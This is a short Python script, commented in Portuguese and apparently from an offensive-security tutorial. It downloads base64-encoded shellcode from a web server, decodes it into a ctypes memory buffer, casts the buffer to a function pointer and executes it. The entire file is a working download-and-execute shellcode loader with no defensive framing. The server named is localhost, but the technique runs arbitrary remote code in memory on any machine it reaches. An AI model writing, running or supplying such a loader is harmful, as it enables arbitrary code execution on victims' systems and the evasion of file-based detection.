import urllib.request
import ctypes
import base64

# obtem o shellcode de nosso servidor web
url = "http://localhost:8000"

response = urllib.request.urlopen(url)

# decodifica o shellcode a partir de dados em base64
shellcode = base64.b64decode(response.read())

# cria um buffer em memoria
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# cria um ponteiro de funcao para o nosso shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

#chama o nosso shellcode
shellcode_func()
